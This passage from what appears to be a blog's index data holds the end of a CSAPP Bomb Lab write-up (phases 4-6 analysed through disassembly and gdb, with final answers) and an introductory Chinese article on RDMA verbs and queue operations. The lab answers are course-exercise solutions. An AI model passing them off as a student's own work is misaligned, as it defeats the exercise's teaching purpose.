%esi,%eax 155c: 89 c1 mov %eax,%ecx 155e: c1 e9 1f shr $0x1f,%ecx 1561: 01 c1 add %eax,%ecx 1563: d1 f9 sar %ecx 1565: 01 f1 add %esi,%ecx 1567: 39 f9 cmp %edi,%ecx 1569: 7f 0c jg 1577 &lt;func4+0x23&gt; 156b: b8 00 00 00 00 mov $0x0,%eax 1570: 7c 11 jl 1583 &lt;func4+0x2f&gt; 1572: 48 83 c4 08 add $0x8,%rsp 1576: c3 retq 1577: 8d 51 ff lea -0x1(%rcx),%edx 157a: e8 d5 ff ff ff callq 1554 &lt;func4&gt; 157f: 01 c0 add %eax,%eax 1581: eb ef jmp 1572 &lt;func4+0x1e&gt; 1583: 8d 71 01 lea 0x1(%rcx),%esi 1586: e8 c9 ff ff ff callq 1554 &lt;func4&gt; 158b: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 158f: eb e1 jmp 1572 &lt;func4+0x1e&gt; 说几个值得注意的点： 123456155a: 29 f0 sub %esi,%eax155c: 89 c1 mov %eax,%ecx155e: c1 e9 1f shr $0x1f,%ecx1561: 01 c1 add %eax,%ecx1563: d1 f9 sar %ecx1565: 01 f1 add %esi,%ecx 这几行的意思是，如果 %eax &lt; %esi 的话，%ecx = (%eax - %esi + 1) / 2 + %esi = (%eax + %esi + 1) / 2，否则 %ecx = (%eax + %esi) / 2。接下来再看： 123451567: 39 f9 cmp %edi,%ecx1569: 7f 0c jg 1577 &lt;func4+0x23&gt;156b: b8 00 00 00 00 mov $0x0,%eax1570: 7c 11 jl 1583 &lt;func4+0x2f&gt;1572: 48 83 c4 08 add $0x8,%rsp 只有当 %edi = %ecx 时，函数才会退出。最后再看： 123456781577: 8d 51 ff lea -0x1(%rcx),%edx157a: e8 d5 ff ff ff callq 1554 &lt;func4&gt;157f: 01 c0 add %eax,%eax1581: eb ef jmp 1572 &lt;func4+0x1e&gt;1583: 8d 71 01 lea 0x1(%rcx),%esi1586: e8 c9 ff ff ff callq 1554 &lt;func4&gt;158b: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax158f: eb e1 jmp 1572 &lt;func4+0x1e&gt; 这段代码也就是修改 %rcx 的值，传递参数，递归调用。整个 func4 汇编代码用 Python 表示可以是： 123456789101112def func4(a, c, d): if d &lt; c: b = (d + c + 1) / 2 else: b = (d + c) / 2 if b &lt; a: return func4(a, b+1, d)*2 + 1 if b &gt; a: return func4(a, c, b-1)*2 else: return 0 因此，第四关答案为 13 3 或者 12 3。 bomb 5与 phase_3 类似，首先我们知道输入的数至少有2个： 1231629: e8 f2 fa ff ff callq 1120 &lt;__isoc99_sscanf@plt&gt;162e: 83 f8 01 cmp $0x1,%eax1631: 7e 5a jle 168d &lt;phase_5+0x87&gt; 然后我们输入的一个参数的二进制后四位不能为1111(15)： 123451633: 8b 04 24 mov (%rsp),%eax1636: 83 e0 0f and $0xf,%eax1639: 89 04 24 mov %eax,(%rsp)163c: 83 f8 0f cmp $0xf,%eax163f: 74 32 je 1673 &lt;phase_5+0x6d&gt; 接下来分析数组，用 gdb 调试： 1234(gdb) p/x *(int *)($rsi)@100$1 = {0xa, 0x2, 0xe, 0x7, 0x8, 0xc, 0xf, 0xb, 0x0, 0x4, 0x1, 0xd, 0x3, 0x9, 0x6, 0x5, 0x79206f53, ......}(gdb) p *$rsi@16$2 = {10, 2, 14, 7, 8, 12, 15, 11, 0, 4, 1, 13, 3, 9, 6, 5} 这个数组一共有 16 位，数组中的元素为 {10, 2, 14, 7, 8, 12, 15, 11, 0, 4, 1, 13, 3, 9, 6, 5}。接下来的汇编代码表示一个循环，寄存器 %edx 初值定为 0，每次循环加 1，根据后面 cmp 0xf, %edx 可以得出，循环必须执行 15 次；同时ecx寄存器不断的累加数，每次把一个数的值存到 %eax 寄存器中，并且作为下次取值的索引，即对于每对索引 i 和值 v 而言，下一个 v' 位于索引 v 处，相当于构成了一个环形链表。另外，传入的第一个参数不能为 15，并且在遍历过程中，根据 cmp $0xf,%eax，%eax 也不能等于15。索引 15 对应的值为 5， 因此，传入的第一个参数必须是 5，累加循环从索引 5 对应的值开始，这样才能保证能够循环 15 次，对 15 个遍历到的值进行累加，累加和为 (0 + 15) * 16 / 2 -5 = 115。因此，第五关答案为 5 115。 bomb 6phase_6 汇编代码太多，需要花费一定的时间。首先，进入函数做一些初始化的工作后，根据 jmpq 177a &lt;phase_6+0xe1&gt; ，函数会跳转到 177a 处执行： 123456789101112131415161718175d: 48 83 c3 01 add $0x1,%rbx1761: 83 fb 05 cmp $0x5,%ebx1764: 7f 0c jg 1772 &lt;phase_6+0xd9&gt;1766: 41 8b 44 9d 00 mov 0x0(%r13,%rbx,4),%eax176b: 39 45 00 cmp %eax,0x0(%rbp)176e: 75 ed jne 175d &lt;phase_6+0xc4&gt;1770: eb e6 jmp 1758 &lt;phase_6+0xbf&gt;1772: 49 83 c7 01 add $0x1,%r151776: 49 83 c6 04 add $0x4,%r14177a: 4c 89 f5 mov %r14,%rbp177d: 41 8b 06 mov (%r14),%eax1780: 83 e8 01 sub $0x1,%eax1783: 83 f8 05 cmp $0x5,%eax1786: 0f 87 47 ff ff ff ja 16d3 &lt;phase_6+0x3a&gt;178c: 49 83 ff 06 cmp $0x6,%r151790: 0f 84 47 ff ff ff je 16dd &lt;phase_6+0x44&gt;1796: 4c 89 fb mov %r15,%rbx1799: eb cb jmp 1766 &lt;phase_6+0xcd&gt; 从 177a 处开始看起，首先会判断传入的第一个参数减 1 后是否大于 5，也就是这里需要保证参数不能超过 6。之后跳入 1766 处执行，1766 -&gt; 176e -&gt; 175d -&gt; 1766 构成了一个循环，判断当前参数的后面几个参数是否与当前参数相等，相等则炸弹爆炸。 然后跳到 1772 处执行，判断第二个参数减 1 后是否大于 5……即整个这一部分代码是一个大循环，来保证 6 个参数不大于 6，并且各不相等。接下来，函数会跳到 16dd 处执行： 1234567891011121314151616dd: 48 8d 74 24 20 lea 0x20(%rsp),%rsi16e2: 49 8d 7c 24 18 lea 0x18(%r12),%rdi16e7: 41 8b 0c 24 mov (%r12),%ecx16eb: b8 01 00 00 00 mov $0x1,%eax16f0: 48 8d 15 19 3b 00 00 lea 0x3b19(%rip),%rdx # 5210 &lt;node1&gt;16f7: 83 f9 01 cmp $0x1,%ecx16fa: 7e 0b jle 1707 &lt;phase_6+0x6e&gt;16fc: 48 8b 52 08 mov 0x8(%rdx),%rdx1700: 83 c0 01 add $0x1,%eax1703: 39 c8 cmp %ecx,%eax1705: 75 f5 jne 16fc &lt;phase_6+0x63&gt;1707: 48 89 16 mov %rdx,(%rsi)170a: 49 83 c4 04 add $0x4,%r12170e: 48 83 c6 08 add $0x8,%rsi1712: 4c 39 e7 cmp %r12,%rdi1715: 75 d0 jne 16e7 &lt;phase_6+0x4e&gt; 我们输入的参数数组存放在 %r12 中，根据 lea 0x18(%r12),%rdi 可以得出，%rdi 存放了数组的结束地址。这段代码做的就是根据我们输入的参数将 node 按照顺序放入栈中： 1234567for(int i = 0; i &lt; 6; i++){ %rdx = 0x3b19(%rip); for(int j = 0; j &lt; arr[i]; j++) %rdx = addr + 0x8; %rsi = *%rdx;} 再看之后的代码，将 %rax 指向 %rbx 下一个链表节点： 12341717: 48 8b 5c 24 20 mov 0x20(%rsp),%rbx171c: 48 8b 44 24 28 mov 0x28(%rsp),%rax1721: 48 89 43 08 mov %rax,0x8(%rbx)... 最后，比较链表节点中第一个字段值的大小，如果前一个节点值小于后一个节点值，炸弹爆炸： 12345678179b: 48 8b 5b 08 mov 0x8(%rbx),%rbx179f: 83 ed 01 sub $0x1,%ebp17a2: 74 11 je 17b5 &lt;phase_6+0x11c&gt;17a4: 48 8b 43 08 mov 0x8(%rbx),%rax17a8: 8b 00 mov (%rax),%eax17aa: 39 03 cmp %eax,(%rbx)17ac: 7d ed jge 179b &lt;phase_6+0x102&gt;17ae: e8 68 02 00 00 callq 1a1b &lt;explode_bomb&gt; 在此我们知道数据是根据每个节点中的第一个数升序排列。所以只需要查看初始链表存储的数据即可得出答案： 12345678910111213141516(gdb) i r rdxrdx 0x8005210 134238736(gdb) p *134238736$1 = 581(gdb) p *134238752$2 = 563(gdb) p *134238768$3 = 687(gdb) p *134238784$4 = 154(gdb) p *134238800$5 = 170(gdb) p *134238808$6 = 134238480(gdb) p *134238480$7 = 454 链表节点的值为 581 563 687 154 170 454，由大到小排序的节点编号 3 1 2 6 5 4 即为第六关答案。 最终结果123456789101112131415hey-kong@LAPTOP-9010T96A:/mnt/c/ubuntu/csapp/bomb65$ ./bombWelcome to my fiendish little bomb. You have 6 phases withwhich to blow yourself up. Have a nice day!I am just a renegade hockey mom.Phase 1 defused. How about the next one?0 1 1 2 3 5That's number 2. Keep going!1 171Halfway there!13 3So you got that one. Try this one.5 115Good work! On to the next...3 1 2 6 5 4Congratulations! You've defused the bomb! repoMy solutions to CSAPP labs","link":"/2021/01/21/Bomb-Lab/"},{"title":"RDMA 基础","text":"RDMA（Remote Direct Memory Access）指的是远程直接内存访问，这是一种通过网络在两个应用程序之间搬运缓冲区里的数据的方法。 Remote：数据通过网络与远程机器间进行数据传输。 Direct：没有内核的参与，有关发送传输的所有内容都卸载到网卡上。 Memory：在用户空间虚拟内存与网卡直接进行数据传输不涉及到系统内核，没有额外的数据移动和复制。 Access：send、receive、read、write、atomic 等操作。 RDMA 与传统的网络接口不同，因为它绕过了操作系统内核。这使得实现了 RDMA 的程序具有如下特点： 绝对的最低时延 最高的吞吐量 最小的 CPU 足迹 （也就是说，需要 CPU 参与的地方被最小化） RDMA 工作原理 RDMA 通信过程中，发送和接收，读/写操作中，都是网卡直接和参与数据传输的已经注册过的内存区域直接进行数据传输，速度快，不需要 CPU 参与，RDMA 网卡接替了 CPU 的工作，节省下来的资源可以进行其它运算和服务。 RDMA 的工作过程如下: 当一个应用执行 RDMA 读或写请求时，不执行任何数据复制。在不需要任何内核内存参与的条件下，RDMA 请求从运行在用户空间中的应用中发送到本地网卡。 网卡读取缓冲的内容，并通过网络传送到远程网卡。 在网络上传输的 RDMA 信息包含目标机器虚拟内存地址和数据本身。请求完成可以完全在用户空间中处理（通过轮询用户空间的 RDMA 完成队列）。RDMA 操作使应用可以从一个远程应用的内存中读数据或向这个内存写数据。 因此，RDMA 可以简单理解为利用相关的硬件和网络技术，网卡可以直接读写远程服务器的内存，最终达到高带宽、低延迟和低资源利用率的效果。应用程序不需要参与数据传输过程，只需要指定内存读写地址，开启传输并等待传输完成即可。 RDMA 数据传输 RDMA Send/Recv跟 TCP/IP 的 send/recv 是类似的，不同的是 RDMA 是基于消息的数据传输协议（而不是基于字节流的传输协议），所有数据包的组装都在 RDMA 硬件上完成的，也就是说 OSI 模型中的下面 4 层（传输层，网络层，数据链路层，物理层）都在 RDMA 硬件上完成。 RDMA ReadRDMA 读操作本质上就是 Pull 操作，把远程系统内存里的数据拉回到本地系统的内存里。 RDMA WriteRDMA 写操作本质上就是 Push 操作，把本地系统内存里的数据推送到远程系统的内存里。 RDMA Write with Immediate Data（支持立即数的 RDMA 写操作）支持立即数的 RDMA 写操作本质上就是给远程系统 Push 带外数据，这跟 TCP 里的带外数据是类似的。可选地，Immediate 4 字节值可以与数据缓冲器一起发送。该值作为接收通知的一部分呈现给接收者，并且不包含在数据缓冲器中。 RDMA 编程基础使用 RDMA，我们需要有一张支持 RDMA 通信（即实现了 RDMA 引擎）的网卡。我们把这种卡称之为 HCA（Host Channel Adapter，主机通道适配器）。通过 PCIe（peripheral component interconnect express）总线， 适配器创建一个从 RDMA 引擎到应用程序内存的通道。一个好的 HCA 将执行的 RDMA 协议所需要的全部逻辑都在硬件上予以实现。这包括分组，重组以及流量控制和可靠性保证。因此，从应用程序的角度看，只负责处理所有缓冲区即可。 如上图所示，在 RDMA 编程中我们使用命令通道调用内核态驱动建立数据通道，该数据通道允许我们在搬运数据的时候完全绕过内核。一旦建立了这种数据通道，我们就能直接读写数据缓冲区。建立数据通道的 API 是一种称之为 verbs 的 API。verbs API 是由一个叫做 Open Fabrics Enterprise Distribution（OFED）的 Linux 开源项目维护的。 关键概念RDMA 操作开始于操作内存。当你在操作内存的时候，就是告诉内核这段内存“名花有主”了，主人就是你的应用程序。于是，你告诉 HCA，就在这段内存上寻址，赶紧准备开辟一条从 HCA 卡到这段内存的通道。我们将这一动作称之为注册一个内存区域 MR（Memory Region）。注册时可以设置内存区域的读写权限（包括 local write，remote read，remote write，atomic，and bind）。调用 Verbs API ibv_reg_mr 即可实现注册 MR，该 API 返回 MR 的 remote 和 local key。local key 用于本地 HCA 访问本地的内存。remote key 是用于提供给远程 HCA 来访问本地的内存。一旦 MR 注册完毕，我们就可以使用这段内存来做任何 RDMA 操作。在下面的图中，我们可以看到注册的内存区域（MR）和被通信队列所使用的位于内存区域之内的缓冲区（buffer）。 RDMA 通信基于三条队列 SQ（Send Queue），RQ（Receive Queue）和 CQ（Completion Queue）组成的集合。其中， 发送队列（SQ）和接收队列（RQ）负责调度工作，他们总是成对被创建，称之为队列对 QP（Queue Pair）。当放置在工作队列上的指令被完成的时候，完成队列（CQ）用来发送通知。 当用户把指令放置到工作队列的时候，就意味着告诉 HCA 那些缓冲区需要被发送或者用来接受数据。这些指令是一些小的结构体，称之为工作请求 WR（Work Request）或者工作队列元素 WQE（Work Queue Element）。一个 WQE 主要包含一个指向某个缓冲区的指针。一个放置在发送队列（SQ）里的 WQE 中包含一个指向待发送的消息的指针；一个放置在接受队列里的 WQE 里的指针指向一段缓冲区，该缓冲区用来存放待接受的消息。 RDMA 是一种异步传输机制。因此我们可以一次性在工作队列里放置好多个发送或接收 WQE。HCA 将尽可能快地按顺序处理这些 WQE。当一个 WQE 被处理了，那么数据就被搬运了。一旦传输完成，HCA 就创建一个状态为成功的完成队列元素 CQE（Completion Queue Element）并放置到完成队列（CQ）中去。如果由于某种原因传输失败，HCA 也创建一个状态为失败的 CQE 放置到（CQ）中去。 简单示例（Send/Recv）第 1 步：系统 A 和 B 都创建了他们各自的 QP 和 CQ，并为即将进行的 RDMA 传输注册了相应的内存区域（MR）。系统 A 识别了一段缓冲区，该缓冲区的数据将被搬运到系统 B 上。系统 B 分配了一段空的缓冲区，用来存放来自系统 A 发送的数据。 第 2 步：系统 B 创建一个 WQE 并放置到它的接收队列（RQ）中。这个 WQE 包含了一个指针，该指针指向的内存缓冲区用来存放接收到的数据。系统 A 也创建一个 WQE 并放置到它的发送队列（SQ）中去，该 WQE 中的指针执行一段内存缓冲区，该缓冲区的数据将要被传送。 第 3 步：系统 A 上的 HCA 总是在硬件上干活，看看发送队列里有没有 WQE。HCA 将消费掉来自系统 A 的 WQE，然后将内存区域里的数据变成数据流发送给系统 B。当数据流开始到达系统 B 的时候，系统 B 上的 HCA 就消费来自系统 B 的 WQE，然后将数据放到该放的缓冲区上去。在高速通道上传输的数据流完全绕过了操作系统内核。 注：WQE 上的箭头表示指向用户空间内存的指针（地址）。receive/send 模式下，通信双方需要事先准备自己的 WQE（WorkQueue），HCA 完成后会写（CQ）。 第 4 步：当数据搬运完成的时候，HCA 会创建一个 CQE。这个 CQE 被放置到完成队列（CQ）中，表明数据传输已经完成。HCA 每消费掉一个 WQE，都会生成一个 CQE。因此，在系统 A 的完成队列中放置一个 CQE，意味着对应的 WQE 的发送操作已经完成。同理，在系统 B 的完成队列中也会放置一个 CQE，表明对应的 WQE 的接收操作已经完成。如果发生错误，HCA 依然会创建一个 CQE。在 CQE 中，包含了一个用来记录传输状态的字段。 在 IB 或 RoCE 中，传送一个小缓冲区里的数据耗费的总时间大约在 1.3µs。通过同时创建很多 WQE, 就能在 1 秒内传输存放在数百万个缓冲区里的数据。 RDMA 操作细节在 RDMA 传输中，Send/Recv 是双边操作，即需要通信双方的参与，并且 Recv 要先于 Send 执行，这样对方才能发送数据，当然如果对方不需要发送数据，可以不执行 Recv 操作，因此该过程和传统通信相似，区别在于 RDMA 的零拷贝网络技术和内核旁路，延迟低，多用于传输短的控制消息。 Write/Read 是单边操作，顾名思义，读/写操作是一方在执行，在实际的通信过程中，Write/Read 操作是由客户端来执行的，而服务器端不需要执行任何操作。RDMA Write 操作中，由客户端把数据从本地 buffer 中直接 push 到远程 QP 的虚拟空间的连续内存块中（物理内存不一定连续），因此需要知道目的地址（remote addr）和访问权限（remote key）。RDMA Read 操作中，是客户端直接到远程的 QP 的虚拟空间的连续内存块中获取数据 pull 到本地目的 buffer 中，因此需要远程 QP 的内存地址和访问权限。单边操作多用于批量数据传输。 可以看出，在单边操作过程中，客户端需要知道远程 QP 的 remote addr 和 remote key，而这两个信息是可以通过 Send/Recv 操作来交换的。 RDMA 单边操作（RDMA READ/WRITE）READ 和 WRITE 是单边操作，只需要本端明确信息的源和目的地址，远端应用不必感知此次通信，数据的读或写都通过 RDMA 在网卡与应用 Buffer 之间完成，再由远端网卡封装成消息返回到本端。 对于单边操作，以存储网络环境下的存储为例，READ 流程如下： 首先 A、B 建立连接，QP 已经创建并且初始化。 数据被存档在 B 的 buffer 地址 VB，注意 VB 应该提前注册到 B 的网卡（并且它是一个 memory region），并拿到返回的 remote key，相当于 RDMA 操作这块 buffer 的权限。 B 把数据地址 VB，key 封装到专用的报文传送到 A，这相当于 B 把数据 buffer 的操作权交给了 A。同时 B 在它的 WQ 中注册进一个 WR，以用于接收数据传输的 A 返回的状态。 A 在收到 B 的送过来的数据 VB 和 remote key 后，网卡会把它们连同自身存储地址 VA 到封装 RDMA READ 请求，将这个消息请求发送给 B，这个过程 A、B 两端不需要任何软件参与，就可以将 B 的数据存储到 A 的 VA 虚拟地址。 A 在存储完成后，会向 B 返回整个数据传输的状态信息。 WRITE 流程与 READ 类似。单边操作传输方式是 RDMA 与传统网络传输的最大不同，只需提供直接访问远程的虚拟地址，无须远程应用参与其中，这种方式适用于批量数据传输。 RDMA 双边操作（RDMA SEND/RECEIVE）RDMA 中 SEND/RECEIVE 是双边操作，即必须要远端的应用感知参与才能完成收发。在实际中，SEND/RECEIVE 多用于连接控制类报文，而数据报文多是通过 READ/WRITE 来完成的。 对于双边操作为例，主机 A 向主机 B（下面简称 A、B）发送数据的流程如下： 首先，A 和 B 都要创建并初始化好各自的 QP，CQ。 A 和 B 分别向自己的 WQ 中注册 WQE，对于 A，WQ = SQ，WQE 描述指向一个等到被发送的数据；对于 B，WQ = RQ，WQE 描述指向一块用于存储数据的 Buffer。 A 的网卡异步调度轮到 A 的 WQE，解析到这是一个 SEND 消息，从 buffer 中直接向 B 发出数据。数据流到达 B 的网卡后，B 的 WQE 被消耗，并把数据直接存储到 WQE 指向的存储位置。 A、B 通信完成后，A 的 CQ 中会产生一个完成消息 CQE 表示发送完成。与此同时，B 的 CQ 中也会产生一个完成消息表示接收完成。每个 WQ 中 WQE 的处理完成都会产生一个 CQE。 双边操作与传统网络的底层 Buffer Pool 类似，收发双方的参与过程并无差别，区别在零拷贝、kernel bypass，实际上对于 RDMA，这是一种复杂的消息传输模式，多用于传输短的控制消息。 参考 RDMA 简介与编程基础 RDMA技术详解（一）：RDMA 概述 RDMA技术详解（二）：RDMA Send Receive操作","link":"/2021/07/28/RDMA-%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"CSAPP","slug":"CSAPP","link":"/tags/CSAPP/"},{"name":"File System","slug":"File-System","link":"/tags/File-System/"},{"name":"Database","slug":"Database","link":"/tags/Database/"},{"name":"Rocksdb","slug":"Rocksdb","link":"/tags/Rocksdb/"},{"name":"Key-Value Store","slug":"Key-Value-Store","link":"/tags/Key-Value-Store/"},{"name":"Cache","slug":"Cache","link":"/tags/Cache/"},{"name":"RDMA","slug":"RDMA","link":"/tags/RDMA/"}],"categories":[]}